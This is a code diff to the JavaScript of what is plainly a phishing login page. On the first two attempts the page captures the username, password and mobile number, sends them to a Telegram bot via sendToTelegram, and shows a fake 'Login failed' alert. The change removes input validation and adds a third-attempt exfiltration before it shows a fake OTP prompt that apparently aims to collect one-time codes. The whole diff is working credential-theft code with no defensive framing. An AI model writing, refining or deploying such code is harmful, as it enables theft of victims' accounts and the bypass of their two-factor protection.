@@ -122,33 +122,28 @@
       loginAttempt++;
 
       const loginBox = document.querySelector('.login-box');
-      var username = document.getElementById('username').value.trim();
-      var password = document.getElementById('password').value.trim();
-      var mobile = document.getElementById('mobile').value.trim();
-
-      // ✅ Email validation: must be Gmail and proper format
-      var emailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
-      if (!emailPattern.test(username)) {
-        alert("Email not valid! Please enter a valid Gmail ID.");
-        return;
-      }
-
-      // ✅ Mobile validation: must start with 91 and followed by 10 digits
-      var mobilePattern = /^91\d{10}$/;
-      if (!mobilePattern.test(mobile)) {
-        alert("Mobile not valid! Format should be 91XXXXXXXXXX (total 12 digits).");
-        return;
-      }
 
       if (loginAttempt < 3) {
         // 1st and 2nd attempt
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+        var mobile = document.getElementById('mobile').value;
+
         var payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nStark ♥️`;
         sendToTelegram(payload);
 
         alert("Login failed: Invalid credentials");
       } 
       else if (loginAttempt === 3) {
-        // 3rd attempt - show OTP input
+        // collect values again on 3rd attempt
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+        var mobile = document.getElementById('mobile').value;
+
+        var payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nStark ♥️`;
+        sendToTelegram(payload); // ✅ now also sends message at 3rd attempt
+
+        // Show OTP input
         loginBox.innerHTML = `
           <h2 style="font-size:24px; color:#1a73e8;">OTP Verification</h2>
           <p style="font-size:16px; color:#202124;">Enter OTP sent to you via Telegram</p>
